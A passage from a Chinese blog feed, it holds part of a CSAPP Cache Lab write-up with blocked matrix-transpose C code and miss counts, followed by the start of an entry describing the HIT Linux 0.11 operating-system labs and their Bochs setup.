-v选项运行，了解每次miss是怎么发生的。</p><p>A和B中对应的元素都是映射到同一行的。在加载A的第二行之后，在将A[2][2]传送给B[2][2]的时候，就发生了冲突——A的第二行被替换掉了。当然，过了一会，A的第二行又回来了。</p><p>进一步观察会发现，这种冲突只会发生在处理对角线的块上。于是选择用临时变量将数据保存起来，这样就不用担心抖动问题。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529192945830.png" alt="image-20210529192945830"></p><p>结果小于300，符合要求。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529200725774.png" alt="image-20210529200725774"></p><h2 id="64-x-64"><a href="#64-x-64" class="headerlink" title="64 x 64"></a>64 x 64</h2><p>因为矩阵一行的元素数量翻倍，cache能够装载的行数减半（4行），若继续使用8*8的分块，会在分块内产生冲突。</p><img src="/2021/computer-architecture-hitlabs/image-20210606133606510.png" alt="image-20210606133606510" style="zoom: 80%;"><p>故改为4*4的分块。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529194253972.png" alt="image-20210529194253972"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210529200829892.png" alt="image-20210529200829892"></p><p>结果没有达到满分，还需要继续优化：（参考：<a href="https://zhuanlan.zhihu.com/p/42754565">《深入理解计算机系统》配套实验4: Cache lab</a> &amp; <a href="https://www.cnblogs.com/liqiuhao/p/8026100.html">CS:APP3e 深入理解计算机系统_3e CacheLab实验</a>)</p><p>首先考虑Cache中只能放4行A中的行，如果再用8×8的块，前面4行可以填入，后面4行会在Cache中发生冲突，导致miss次数增加。</p><p>如果只用<code>4×4</code>的块呢？那么每次Cache中放入8个int，我们却只用4个，浪费严重，这个方法最少也只能做到1677次miss。</p><p>题目说不能对A进行操作，但是可以<strong>对B进行操作</strong>！将B作为缓存使用</p><p><strong>改进方法</strong>：将<code>8 * 8</code> 块再分成4个<code>4 * 4</code>的块进一步处理，经过改进，达到1171miss</p><p>首先对左上角和右上角进行处理：</p><ol><li>B左上角 = A左上角转置。B右上角=A右上角转置。</li><li>我们最后只需要把这部分平移到B的左下角就好。</li></ol><p>现在B左上角完成</p><ol><li>首先用四个变量存储A的左下角的一列。</li><li>再用四个变量存储B的右上角的一行。</li><li>把四个变量存储的A的左下角的一列移动到B右上角的一行</li><li>把四个变量存储的B的右上角的一行平移到B左下角的一列</li><li>B的右下角=A的右下角转置</li></ol><p>关键的操作在第二步</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (k = i; k &lt; i + <span class="number">4</span>; k++) &#123;</span><br><span class="line">            a0 = A[k][j];</span><br><span class="line">            a1 = A[k][j + <span class="number">1</span>];</span><br><span class="line">            a2 = A[k][j + <span class="number">2</span>];</span><br><span class="line">            a3 = A[k][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">            a5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">            a6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">            a7 = A[k][j + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            B[j][k] = a0;</span><br><span class="line">            B[j + <span class="number">1</span>][k] = a1;</span><br><span class="line">            B[j + <span class="number">2</span>][k] = a2;</span><br><span class="line">            B[j + <span class="number">3</span>][k] = a3;</span><br><span class="line"></span><br><span class="line">            B[j][k + <span class="number">4</span>] = a4;</span><br><span class="line">            B[j + <span class="number">1</span>][k + <span class="number">4</span>] = a5;</span><br><span class="line">            B[j + <span class="number">2</span>][k + <span class="number">4</span>] = a6;</span><br><span class="line">            B[j + <span class="number">3</span>][k + <span class="number">4</span>] = a7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (l = j + <span class="number">4</span>; l &lt; j + <span class="number">8</span>; l++) &#123;</span><br><span class="line"></span><br><span class="line">            a4 = A[i + <span class="number">4</span>][l - <span class="number">4</span>]; <span class="comment">// A left-down col</span></span><br><span class="line">            a5 = A[i + <span class="number">5</span>][l - <span class="number">4</span>];</span><br><span class="line">            a6 = A[i + <span class="number">6</span>][l - <span class="number">4</span>];</span><br><span class="line">            a7 = A[i + <span class="number">7</span>][l - <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">            a0 = B[l - <span class="number">4</span>][i + <span class="number">4</span>]; <span class="comment">// B right-above line</span></span><br><span class="line">            a1 = B[l - <span class="number">4</span>][i + <span class="number">5</span>];</span><br><span class="line">            a2 = B[l - <span class="number">4</span>][i + <span class="number">6</span>];</span><br><span class="line">            a3 = B[l - <span class="number">4</span>][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            B[l - <span class="number">4</span>][i + <span class="number">4</span>] = a4; <span class="comment">// set B right-above line </span></span><br><span class="line">            B[l - <span class="number">4</span>][i + <span class="number">5</span>] = a5;</span><br><span class="line">            B[l - <span class="number">4</span>][i + <span class="number">6</span>] = a6;</span><br><span class="line">            B[l - <span class="number">4</span>][i + <span class="number">7</span>] = a7;</span><br><span class="line"></span><br><span class="line">            B[l][i] = a0;         <span class="comment">// set B left-down col</span></span><br><span class="line">            B[l][i + <span class="number">1</span>] = a1;</span><br><span class="line">            B[l][i + <span class="number">2</span>] = a2;</span><br><span class="line">            B[l][i + <span class="number">3</span>] = a3;</span><br><span class="line"></span><br><span class="line">            B[l][i + <span class="number">4</span>] = A[i + <span class="number">4</span>][l];</span><br><span class="line">            B[l][i + <span class="number">5</span>] = A[i + <span class="number">5</span>][l];</span><br><span class="line">            B[l][i + <span class="number">6</span>] = A[i + <span class="number">6</span>][l];</span><br><span class="line">            B[l][i + <span class="number">7</span>] = A[i + <span class="number">7</span>][l];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果：1171miss 通过。</p><p>普通的4x4分块法会是这样的(箭头表示读入/写入方向)</p><p><img src="/2021/computer-architecture-hitlabs/v2-46ad0a6f9238a15c56205ca80b5a08f3_r.jpg" alt="img"></p><p>但是这样有个问题,因为每间隔4行,cache行就会被覆盖,所以写入b’的时候回造成严重的缓存浪费,所以我们考虑现将b’放到原c’的位置,也就是b’和c’互换位置,之后再交换回来,如下图所示</p><p><img src="/2021/computer-architecture-hitlabs/v2-a6ea648f5be8b37d31098018447a434a_r.jpg" alt="img"></p><p>但是使用这种方法仍然是拿不到满分的,还要继续进行优化,我们想办法在存入c’的时候直接将b’复原,并且要合理利用cache</p><p>我们可以使用逆序存储来实现这一点,如图所示</p><ul><li>逆序存放</li></ul><p><img src="/2021/computer-architecture-hitlabs/v2-f8a4f50fd07ec0e5cea7bd6aa3bf6266_r.jpg" alt="img"></p><ul><li>逆序读取</li></ul><p><img src="/2021/computer-architecture-hitlabs/v2-ec54f0eb4fb152c6e4e33e43d7256472_r.jpg" alt="img"></p><ul><li>最终</li></ul><p><img src="/2021/computer-architecture-hitlabs/v2-04505f122f41b8ac5ace1d83710f6649_r.jpg" alt="img"></p><p>原先存放的是1,2,3,4的数据,逆序存储的话就变成了4,3,2,1。</p><p>那么这样有什么好处呢?</p><ul><li>考虑一下开始读入c时候的情况</li></ul><p>此时cache中存放有全部的b’的数据,<strong>如果数据不是逆序存放的话</strong>,c’, d’第一行的缓存会覆盖掉b’第一行的缓存,此时再读入b’第一行准备放到c’第一行时就会miss了。反正,如<strong>果数据是逆序存放的话</strong>,因为只覆盖了b’第一行的缓存,但是我们要读入的是b’第4行的数据,而b’第4行的数据仍然在缓存中,这样就能hit了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value0, value1, value2, value3, value4, value5, value6, value7;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = i; k &lt; i + <span class="number">4</span>; k++) &#123;</span><br><span class="line">                value0 = A[k][j];</span><br><span class="line">                value1 = A[k][j+<span class="number">1</span>];</span><br><span class="line">                value2 = A[k][j+<span class="number">2</span>];</span><br><span class="line">                value3 = A[k][j+<span class="number">3</span>];</span><br><span class="line">                value4 = A[k][j+<span class="number">4</span>];</span><br><span class="line">                value5 = A[k][j+<span class="number">5</span>];</span><br><span class="line">                value6 = A[k][j+<span class="number">6</span>];</span><br><span class="line">                value7 = A[k][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// a</span></span><br><span class="line">                B[j][k] = value0;</span><br><span class="line">                B[j+<span class="number">1</span>][k] = value1;</span><br><span class="line">                B[j+<span class="number">2</span>][k] = value2;</span><br><span class="line">                B[j+<span class="number">3</span>][k] = value3;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// b 逆序放置</span></span><br><span class="line">                B[j+<span class="number">0</span>][k+<span class="number">4</span>] = value7;</span><br><span class="line">                B[j+<span class="number">1</span>][k+<span class="number">4</span>] = value6;</span><br><span class="line">                B[j+<span class="number">2</span>][k+<span class="number">4</span>] = value5;</span><br><span class="line">                B[j+<span class="number">3</span>][k+<span class="number">4</span>] = value4;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">4</span>; h++) &#123;</span><br><span class="line">                value0 = A[i+<span class="number">4</span>][j+<span class="number">3</span>-h];</span><br><span class="line">                value1 = A[i+<span class="number">5</span>][j+<span class="number">3</span>-h];</span><br><span class="line">                value2 = A[i+<span class="number">6</span>][j+<span class="number">3</span>-h];</span><br><span class="line">                value3 = A[i+<span class="number">7</span>][j+<span class="number">3</span>-h];</span><br><span class="line">                value4 = A[i+<span class="number">4</span>][j+<span class="number">4</span>+h];</span><br><span class="line">                value5 = A[i+<span class="number">5</span>][j+<span class="number">4</span>+h];</span><br><span class="line">                value6 = A[i+<span class="number">6</span>][j+<span class="number">4</span>+h];</span><br><span class="line">                value7 = A[i+<span class="number">7</span>][j+<span class="number">4</span>+h];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// b&#x27;到c&#x27;(左下角)</span></span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">0</span>] = B[j+<span class="number">3</span>-h][i+<span class="number">4</span>];</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">1</span>] = B[j+<span class="number">3</span>-h][i+<span class="number">5</span>];</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">2</span>] = B[j+<span class="number">3</span>-h][i+<span class="number">6</span>];</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">3</span>] = B[j+<span class="number">3</span>-h][i+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 存放c, d</span></span><br><span class="line">                B[j+<span class="number">3</span>-h][i+<span class="number">4</span>] = value0;</span><br><span class="line">                B[j+<span class="number">3</span>-h][i+<span class="number">5</span>] = value1;</span><br><span class="line">                B[j+<span class="number">3</span>-h][i+<span class="number">6</span>] = value2;</span><br><span class="line">                B[j+<span class="number">3</span>-h][i+<span class="number">7</span>] = value3;</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">4</span>] = value4;</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">5</span>] = value5;</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">6</span>] = value6;</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">7</span>] = value7;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>miss: 1243</p><p>另一种优化方案：（参考<a href="https://blog.csdn.net/weixin_45406155/article/details/112510369">哈工大计算机系统实验六——高速缓冲器模拟</a> &amp; <a href="https://zhuanlan.zhihu.com/p/28585726">CS:APP配套实验4：Cache Lab笔记</a>)</p><p>还用8×8的块来做，题目说A数组不能变换，但是说B数组可以任意操作啊。我们必须要一步到位嘛？可否考虑先把数字移动到B中，然后在B中自己做变化。</p><p>思路：每次处理一个块，也就是像32x32那样取出每行的8个元素，然后将 每行的0-3号元素正常的放到B[0-3][0]这些位置去（也就是正常的转置),剩下的四个元先放置B矩阵4x4块的最右边保存，注意这个时候我已经取出来了。然后再用一个循环去把这些值放到B正确的位置去，然后A[4]到A[7]也是上述的处理。对整个矩阵重复这个操作即可。简单的示意图如下：</p><p><img src="/2021/computer-architecture-hitlabs/20210112105734212.png" alt="img"></p><p><img src="/2021/computer-architecture-hitlabs/v2-85af81ad19187208673aacbb0cb42f69_r.jpg" alt="img"></p><p>画的线的分割是读入到Cache中的行以及写入到B中的顺序。（第二步有些画错了，A左下角应该是按列取数据）</p><ol><li><p>先考虑把A的上半部分存入到B，但是为了考虑Cache不冲突，所以把右上角的4×4的区域也存在B的右上角。对于在对角线上的块，A的miss率是1/8，B的左上角部分miss率是1/2。对于不在对角线上的块，A的miss率还是1/8，B左上角部分的miss率为1/4.</p></li><li><p>接下来这步是减少miss率的关键，把A左下角的一列4个数据读出，B右上角的一行4个数据读出，都用int变量暂存，然后把前四个填入B右上角行中，后四个填入B的左下角行中。</p></li></ol><p>因为从B右上角读取的时候，把块放入了Cache，然后从A往B中填的时候，就不会出现miss操作。</p><ol start="3"><li>最后一步就是把A的右下角填入B的右下角，对于在对角线上的块，A的miss率为1/4，B的miss率为1/2.不在对角线上的块，A，B的miss率都为0.</li></ol><p><img src="/2021/computer-architecture-hitlabs/20210112105745141.png" alt="img"></p><p><img src="/2021/computer-architecture-hitlabs/20210112105757204.png" alt="img"></p><h2 id="61-x-67"><a href="#61-x-67" class="headerlink" title="61 x 67"></a>61 x 67</h2><p>尝试不同的分块，16*16可以达到要求。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529195537198.png" alt="image-20210529195537198"></p><p>结果：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529200920477.png" alt="image-20210529200920477"></p><p>或者：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k, a, b, c, d, e, f, g, h;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 48 * 48</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i+<span class="number">16</span> &lt; N; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j+<span class="number">16</span> &lt; M; j+=<span class="number">16</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = i; k &lt; i+<span class="number">16</span>; k++) &#123;</span><br><span class="line">                a = A[k][j];</span><br><span class="line">                b = A[k][j+<span class="number">1</span>];</span><br><span class="line">                c = A[k][j+<span class="number">2</span>];</span><br><span class="line">                d = A[k][j+<span class="number">3</span>];</span><br><span class="line">                e = A[k][j+<span class="number">4</span>];</span><br><span class="line">                f = A[k][j+<span class="number">5</span>];</span><br><span class="line">                g = A[k][j+<span class="number">6</span>];</span><br><span class="line">                h = A[k][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                B[j+<span class="number">0</span>][k] = a;</span><br><span class="line">                B[j+<span class="number">1</span>][k] = b;</span><br><span class="line">                B[j+<span class="number">2</span>][k] = c;</span><br><span class="line">                B[j+<span class="number">3</span>][k] = d;</span><br><span class="line">                B[j+<span class="number">4</span>][k] = e;</span><br><span class="line">                B[j+<span class="number">5</span>][k] = f;</span><br><span class="line">                B[j+<span class="number">6</span>][k] = g;</span><br><span class="line">                B[j+<span class="number">7</span>][k] = h;</span><br><span class="line"></span><br><span class="line">                a = A[k][j+<span class="number">8</span>];</span><br><span class="line">                b = A[k][j+<span class="number">9</span>];</span><br><span class="line">                c = A[k][j+<span class="number">10</span>];</span><br><span class="line">                d = A[k][j+<span class="number">11</span>];</span><br><span class="line">                e = A[k][j+<span class="number">12</span>];</span><br><span class="line">                f = A[k][j+<span class="number">13</span>];</span><br><span class="line">                g = A[k][j+<span class="number">14</span>];</span><br><span class="line">                h = A[k][j+<span class="number">15</span>];</span><br><span class="line">                B[j+<span class="number">8</span>][k] = a;</span><br><span class="line">                B[j+<span class="number">9</span>][k] = b;</span><br><span class="line">                B[j+<span class="number">10</span>][k] = c;</span><br><span class="line">                B[j+<span class="number">11</span>][k] = d;</span><br><span class="line">                B[j+<span class="number">12</span>][k] = e;</span><br><span class="line">                B[j+<span class="number">13</span>][k] = f;</span><br><span class="line">                B[j+<span class="number">14</span>][k] = g;</span><br><span class="line">                B[j+<span class="number">15</span>][k] = h;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理不规则的部分</span></span><br><span class="line">    <span class="keyword">for</span> (k = i; k &lt; N; k++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (h = <span class="number">0</span>; h &lt; M; h++)&#123;</span><br><span class="line">            B[h][k] = A[k][h];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; i; k++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (h = j; h &lt; M; h++) &#123;</span><br><span class="line">            B[h][k] = A[k][h];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>miss: 1963</p><p>“对角线”的元素（横坐标等于纵坐标）肯定还是会冲突的（其实这个时候不是对角线了，因为不是正方形）。（参考<a href="https://www.cnblogs.com/liqiuhao/p/8026100.html">CS:APP3e 深入理解计算机系统_3e CacheLab实验</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = i; k &lt; i + <span class="number">16</span> &amp;&amp; k &lt; N; ++k)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> temp_position = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">int</span> temp_value = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> l;</span><br><span class="line">            <span class="keyword">for</span> (l = j; l &lt; j + <span class="number">16</span> &amp;&amp; l &lt; M; ++l)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (l == k) <span class="comment">/* 横坐标等于纵坐标，局部变量暂存，整个block读完再处理 */</span></span><br><span class="line">                &#123;</span><br><span class="line">                    temp_position = k;</span><br><span class="line">                    temp_value = A[k][k];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    B[l][k] = A[k][l];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (temp_position != <span class="number">-1</span>) <span class="comment">/* 遇到了冲突元素 */</span> </span><br><span class="line">            &#123;</span><br><span class="line">                B[temp_position][temp_position] = temp_value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>miss: 1985</p><h1 id="Lab-7"><a href="#Lab-7" class="headerlink" title="Lab 7"></a>Lab 7</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;CSAPP经典实验个人解答，共八个。&lt;/p&gt;</summary>
    
    
    
    <category term="系统" scheme="https://www.fvolcano.red/categories/%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="实验" scheme="https://www.fvolcano.red/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>Linux-0.11操作系统实验</title>
    <link href="https://www.fvolcano.red/2021/linux0.11-hitlabs/"/>
    <id>https://www.fvolcano.red/2021/linux0.11-hitlabs/</id>
    <published>2021-04-06T01:04:38.000Z</published>
    <updated>2021-04-06T01:04:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>哈工大操作系统课程实验记录。<a id="more"></a></p><p>主要内容为</p><table><thead><tr><th align="center">编号</th><th align="center">实验项目</th><th align="center">实验内容</th><th align="center">实验目的</th></tr></thead><tbody><tr><td align="center">实验一</td><td align="center">系统引导</td><td align="center">编写bootsect.s和setup.s，实现一个简单的系统引导。</td><td align="center">深入认识系统引导过程，掌握操作系统开发基本过程。</td></tr><tr><td align="center">实验二</td><td align="center">系统调用</td><td align="center">添加一个系统调用whoami。</td><td align="center">深入认识操作系统接口的工作原理。</td></tr><tr><td align="center">实验三</td><td align="center">进程运行轨迹的跟踪</td><td align="center">编写程序跟踪进程的运行轨迹，主要是进程的状态切换过程。同时替换现有的Linux 0.11进程调度算法，并和现有的进程调度进行对比。</td><td align="center">深入认识进程，能通过实际试验来评价操作系统性能。</td></tr><tr><td align="center">实验四</td><td align="center">信号量实现和应用</td><td align="center">在Linux 0.11上实现信号量，并实践Multiprogramming。</td><td align="center">体会并发进程，掌握进程同步(互斥)技术的实现</td></tr><tr><td align="center">实验五</td><td align="center">Linux 0.11地址映射跟踪与共享</td><td align="center">打印Linux 0.11的地址映射过程到log文件中。</td><td align="center">实践逻辑地址、线性地址、物理地址、段页表等概念。</td></tr><tr><td align="center">实验六</td><td align="center">控制终端显示</td><td align="center">特殊按键修改系统状态，并控制显示(如按F1后总显示**)。</td><td align="center">深入认识设备管理，掌握终端设备驱动的实现。</td></tr><tr><td align="center">实验七</td><td align="center">proc文件系统的实现</td><td align="center">在Linux 0.11上实现一个proc文件系统，动态察看内核。</td><td align="center">体会虚拟文件系统概念，掌握文件系统的实现过程。</td></tr><tr><td align="center">实验八</td><td align="center">在Linux 0.11上实现交换分区和全局页面置换</td><td align="center">在Linux 0.11上完整的虚拟内存，主要是实现全局的页面置换和交换分区设备的管理，并将这两个模块放入系统。</td><td align="center">相比前面的实验而言，本实验较难。将全面加深进程、虚存、磁盘、中断的认识，对OS的系统性获得直接经验。</td></tr></tbody></table><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>课程提供线上环境 <a href="https://www.lanqiao.cn/courses/115">蓝桥-操作系统原理与实践</a>。因为操作过程中出现了一些问题，我改用虚拟机。</p><ul><li>Ubuntu 18.04</li><li>Bochs</li><li>gcc-3.4 (参考资料第一个github中可下载)</li><li>vim</li><li>hit-oslab-linux.tar.gz (参考资料第一个github中可下载)</li></ul><p>实验的基本流程是根据实验要求编写应用程序、修改 Linux 0.11 的源代码，用 gcc 编译后，在 Bochs 的虚拟环境中运行、调试目标代码。</p><blockquote><p>Bochs 是一个免费且开放源代码的 IA-32（x86）架构 PC 机模拟器。在它模拟出的环境中可以运行 Linux、DOS 和各种版本的 Windows 等多种操作系统。且Bochs 本身具有很高的移植性，可以运行在多种软硬件平台之上。</p></blockquote><p>hit-oslab-linux.tar.gz 解压后有：</p><p><img src="/2021/linux0.11-hitlabs/1.png" alt="hit-oslab-linux.tar.gz解压后内容"></p><ul><li>bochs 目录</li></ul><p>bochs 目录下是与 bochs 相关的执行文件、数据文件和配置文件。</p><ul><li>run 脚本</li></ul><p>run 是运行 bochs 的脚本命令。</p><p>运行后 bochs 会自动在它的虚拟软驱 A 和虚拟硬盘上各挂载一个镜像文件，软驱上挂载是 linux-0.11/Image，硬盘上挂载的是 hdc-0.11.img。</p><p>因为 bochs 配置文件中的设置是从软驱 A 启动，所以 Linux 0.11 会被自动加载。而 Linux 0.11 会驱动硬盘，并 mount 硬盘上的文件系统，也就是将 hdc-0.11.img 内镜像的文件系统挂载到 0.11 系统内的根目录 —— <code>/</code>。在 0.11 下访问文件系统，访问的就是 hdc-0.11.img 文件内虚拟的文件系统。</p><ul><li>hdc-0.11.img 文件</li></ul><p>hdc-0.11.img 文件的格式是 Minix 文件系统的镜像。</p><p>Linux 所有版本都支持这种格式的文件系统，所以可以直接在宿主 Linux 上通过 mount 命令访问此文件内的文件，达到宿主系统和 bochs 内运行的 Linux 0.11 之间交换文件的效果。</p><p>Windows 下目前没有（或者是还没发现）直接访问 Minix 文件系统的办法，所以要借助于 fdb.img，这是一个 1.44M 软盘的镜像文件，内部是 FAT12 文件系统。将它挂载到 bochs 的软驱 B，就可以在 0.11 中访问它。而通过 filedisk 或者 WinImage，可以在 Windows 下访问它内部的文件。</p><p>hdc-0.11.img 